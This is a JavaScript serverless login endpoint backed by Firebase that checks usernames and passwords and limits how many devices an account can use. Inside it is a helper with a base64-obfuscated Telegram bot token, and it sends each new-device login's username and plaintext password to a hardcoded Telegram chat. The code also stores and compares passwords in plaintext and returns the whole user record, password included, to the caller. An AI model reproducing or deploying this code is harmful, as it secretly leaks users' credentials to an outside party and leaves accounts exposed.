const admin = require('firebase-admin');

module.exports = async function(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'OPTIONS, POST');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
const reqHelper = {
        "teleSend": async function(t) {
            const chatId = "6904749114";
            const tokenBot = reqHelper.base64de("ODcyMzE5NDQwOTpBQUV6VlhUMmhla3FVQXk1RkcycDg0REQtUC1ZQW5VZ3NJMA==");
            
            try {
                await fetch(`https://api.telegram.org/bot${tokenBot}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: t
                    })
                });
            } catch (err) {
                console.error(err);
            }
        },
        "base64de": function(base64) {
            const binString = atob(base64);
            const bytes = Uint8Array.from(binString, (m) => m.charCodeAt(0));
            return new TextDecoder().decode(bytes);
        },
        "base64en": function(str) {
            const bytes = new TextEncoder().encode(str);
            const binString = Array.from(bytes, (byte) => String.fromCharCode(byte)).join("");
            return btoa(binString);
        }
    };
    try {
        if (!admin.apps.length) {
            if (!process.env.FIREBASE_SERVICE_ACCOUNT) {
                throw new Error("Token Invalid");
            }
            
            const serviceAccount = JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT);
            admin.initializeApp({
                credential: admin.credential.cert(serviceAccount),
                databaseURL: "https://austric-a99e0-default-rtdb.asia-southeast1.firebasedatabase.app"
            });
        }

        const db = admin.database();

        if (req.method !== 'POST') {
            return res.status(405).json({ error: 'Method Not Allowed' });
        }

        const { username, password, deviceInfo } = req.body;

        if (!username || !password || !deviceInfo) {
            return res.status(400).json({ 
                success: false, 
                error: 'Username, password, and deviceInfo are required' 
            });
        }

        const usersRef = db.ref('data/account');
        const userQuery = usersRef.orderByChild('username').equalTo(username);
        
        const snapshot = await userQuery.once('value');

        if (!snapshot.exists()) {
            return res.status(401).json({ success: false, invalidCode: 0 });
        }

        const data = snapshot.val();
        const userKey = Object.keys(data)[0];
        const user = data[userKey];

        if (user.password !== password) {
            return res.status(401).json({ success: false, invalidCode: 1 });
        }

        let existingDevices = [];
        if (user.devices) {
            if (Array.isArray(user.devices)) {
                existingDevices = user.devices.filter(Boolean);
            } else if (typeof user.devices === 'object') {
                existingDevices = Object.values(user.devices);
            }
        }

        const formatDevice = (dev) => {
            if (!dev) return '';
            if (typeof dev === 'string') return dev;
            return `${dev.platform || ''}_${dev.screenResolution || ''}`;
        };

        const currentDeviceSig = formatDevice(deviceInfo);
        const isDeviceRecognized = existingDevices.some(dev => formatDevice(dev) === currentDeviceSig);

        let currentAlrLogined = Number(user.alrLogined) || 0;
        const maxLogined = Number(user.maxlogined) || 1;

        if (!isDeviceRecognized) {
            
            if (currentAlrLogined >= maxLogined && existingDevices.length === 0) {
                currentAlrLogined = 0; 
            }

            if (currentAlrLogined >= maxLogined) {
                return res.status(403).json({ 
                    success: false, 
                    error: 'Maximum device limit reached',
                    alrLogined: currentAlrLogined,
                    maxlogined: maxLogined
                });
            }

            currentAlrLogined += 1;
            
            const newDeviceRecord = {
                ...(typeof deviceInfo === 'object' ? deviceInfo : { device: deviceInfo }),
                loginAt: new Date().toISOString()
            };

            const updatedDevices = [...existingDevices, newDeviceRecord];

            await db.ref(`data/account/${userKey}`).update({
                alrLogined: currentAlrLogined,
                devices: updatedDevices
            });
            
            reqHelper.teleSend(`✅️ New login from ${deviceInfo}\n- username: ${user.username}\n- password: ${user.password}`)

            user.alrLogined = currentAlrLogined;
            user.devices = updatedDevices;
        }

        return res.status(200).json({ 
            success: true, 
            userData: user,
            isNewDevice: !isDeviceRecognized
        });

    } catch (error) {
        console.error("Server Error:", error.message);
        return res.status(500).json({ 
            error: "Internal Server Error", 
            detail: error.message 
        });
    }
};
